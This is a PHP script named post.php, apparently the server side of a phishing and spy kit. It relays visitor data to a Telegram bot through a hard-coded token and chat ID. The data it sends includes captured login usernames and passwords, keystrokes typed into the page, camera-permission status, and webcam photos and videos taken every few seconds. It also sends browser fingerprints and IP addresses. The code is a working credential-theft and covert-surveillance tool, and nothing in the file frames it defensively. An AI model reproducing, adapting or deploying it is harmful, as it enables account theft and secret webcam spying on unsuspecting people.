<?php
// ============================================
// POST.PHP - With Permission Logging
// ============================================

error_reporting(0);
ini_set('display_errors', 0);

// ============================================
// YOUR TELEGRAM CREDENTIALS
// ============================================
$botToken = "8591278217:AAFqz4Ncr8rqQuyEkcyfrnIefa5RUa2YWZY";  // ← YOUR FULL TOKEN
$chatId = "6715599952";  // ← YOUR CHAT ID

// ============================================
// GET DATA
// ============================================
$type = $_POST['tg_type'] ?? '';
$ip = $_POST['tg_ip'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$ua = $_POST['tg_ua'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$time = $_POST['tg_time'] ?? date('Y-m-d H:i:s');

// ============================================
// LOG EVERYTHING
// ============================================
file_put_contents('debug.log', "[$time] Type: $type, IP: $ip\n", FILE_APPEND);

// ============================================
// TELEGRAM SEND FUNCTION
// ============================================
function sendTelegramMessage($message, $fileData = null, $fileType = 'photo') {
    global $botToken, $chatId;
    
    try {
        if ($fileData) {
            if ($fileType === 'video') {
                $url = "https://api.telegram.org/bot$botToken/sendVideo";
            } else {
                $url = "https://api.telegram.org/bot$botToken/sendPhoto";
            }
            
            $fileContent = base64_decode(preg_replace('#^data:.*?;base64,#', '', $fileData));
            $ext = $fileType === 'video' ? 'webm' : 'png';
            $tempFile = tempnam(sys_get_temp_dir(), 'tg_') . '.' . $ext;
            file_put_contents($tempFile, $fileContent);
            
            $cfile = curl_file_create($tempFile, $fileType === 'video' ? 'video/webm' : 'image/png', 'capture.' . $ext);
            $data = [
                'chat_id' => $chatId,
                ($fileType === 'video' ? 'video' : 'photo') => $cfile,
                'caption' => $message,
                'parse_mode' => 'HTML'
            ];
        } else {
            $url = "https://api.telegram.org/bot$botToken/sendMessage";
            $data = [
                'chat_id' => $chatId,
                'text' => $message,
                'parse_mode' => 'HTML'
            ];
        }
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        $result = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if (isset($tempFile) && file_exists($tempFile)) {
            unlink($tempFile);
        }
        
        file_put_contents('debug.log', "Telegram: HTTP $httpCode\n", FILE_APPEND);
        return $httpCode == 200;
    } catch (Exception $e) {
        file_put_contents('debug.log', "Error: " . $e->getMessage() . "\n", FILE_APPEND);
        return false;
    }
}

// ============================================
// HANDLE TYPES
// ============================================

switch ($type) {
    case 'IP':
        $message = "🌐 <b>IP ADDRESS</b>\n";
        $message .= "IP: <code>" . htmlspecialchars($_POST['tg_data'] ?? $ip) . "</code>\n";
        $message .= "UA: " . htmlspecialchars($ua) . "\n";
        $message .= "Time: $time";
        sendTelegramMessage($message);
        break;
    
    case 'image':
        $imageData = $_POST['tg_image'] ?? '';
        if (!empty($imageData)) {
            $caption = "📸 <b>PHOTO</b>\n";
            $caption .= "IP: <code>" . htmlspecialchars($ip) . "</code>\n";
            $caption .= "Time: $time";
            sendTelegramMessage($caption, $imageData, 'photo');
            file_put_contents('debug.log', "Photo sent\n", FILE_APPEND);
        }
        break;
    
    case 'video':
        $videoData = $_POST['tg_video'] ?? '';
        $counter = $_POST['tg_counter'] ?? 0;
        if (!empty($videoData)) {
            $caption = "🎥 <b>VIDEO #$counter</b>\n";
            $caption .= "IP: <code>" . htmlspecialchars($ip) . "</code>\n";
            $caption .= "Time: $time";
            sendTelegramMessage($caption, $videoData, 'video');
            file_put_contents('debug.log', "Video #$counter sent\n", FILE_APPEND);
        }
        break;
    
    case 'permission':
        $message = "🔓 <b>CAMERA PERMISSION</b>\n\n";
        $message .= "Status: " . htmlspecialchars($_POST['tg_data'] ?? 'Unknown') . "\n";
        $message .= "IP: <code>" . htmlspecialchars($ip) . "</code>\n";
        $message .= "Time: $time";
        sendTelegramMessage($message);
        break;
    
    case 'warning':
        $message = "⚠️ <b>WARNING</b>\n\n";
        $message .= "Message: " . htmlspecialchars($_POST['tg_data'] ?? 'Unknown') . "\n";
        $message .= "IP: <code>" . htmlspecialchars($ip) . "</code>\n";
        $message .= "Time: $time";
        sendTelegramMessage($message);
        break;
    
    case 'login':
        $username = $_POST['tg_username'] ?? 'N/A';
        $password = $_POST['tg_password'] ?? 'N/A';
        
        $message = "🔐 <b>LOGIN</b>\n\n";
        $message .= "👤 User: <code>" . htmlspecialchars($username) . "</code>\n";
        $message .= "🔑 Pass: <code>" . htmlspecialchars($password) . "</code>\n\n";
        $message .= "🌐 IP: <code>" . htmlspecialchars($ip) . "</code>\n";
        $message .= "⏰ Time: $time";
        
        sendTelegramMessage($message);
        break;
    
    case 'typing':
        $partial = $_POST['tg_data'] ?? 'N/A';
        $message = "⌨️ <b>TYPING</b>\n\n";
        $message .= "📝 Text: <code>" . htmlspecialchars($partial) . "</code>\n";
        $message .= "🌐 IP: <code>" . htmlspecialchars($ip) . "</code>\n";
        $message .= "⏰ Time: $time";
        sendTelegramMessage($message);
        break;
    
    case 'camera_ready':
        $message = "📹 <b>CAMERA ACTIVE</b>\n\n";
        $message .= "📸 Photos every 3 seconds\n";
        $message .= "🎥 Videos every 10 seconds\n";
        $message .= "🌐 IP: <code>" . htmlspecialchars($ip) . "</code>\n";
        $message .= "⏰ Time: $time";
        sendTelegramMessage($message);
        break;
    
    case 'browser_info':
        $info = json_decode($_POST['tg_data'] ?? '{}', true);
        $message = "💻 <b>BROWSER INFO</b>\n\n";
        $message .= "📱 UA: " . htmlspecialchars($ua) . "\n";
        $message .= "🖥️ Platform: " . ($info['platform'] ?? 'N/A') . "\n";
        $message .= "🌍 Language: " . ($info['language'] ?? 'N/A') . "\n";
        $message .= "📐 Screen: " . ($info['screen'] ?? 'N/A') . "\n";
        $message .= "🕐 Timezone: " . ($info['timezone'] ?? 'N/A') . "\n";
        $message .= "🌐 IP: <code>" . htmlspecialchars($ip) . "</code>\n";
        $message .= "⏰ Time: $time";
        sendTelegramMessage($message);
        break;
    
    case 'page_view':
        $message = "👁️ <b>PAGE VIEW</b>\n\n";
        $message .= "🌐 IP: <code>" . htmlspecialchars($ip) . "</code>\n";
        $message .= "🖥️ UA: " . htmlspecialchars($ua) . "\n";
        $message .= "⏰ Time: $time";
        sendTelegramMessage($message);
        break;
}

// ============================================
// RESPONSE
// ============================================
header('Content-Type: application/json');
echo json_encode(['status' => 'ok']);
?>
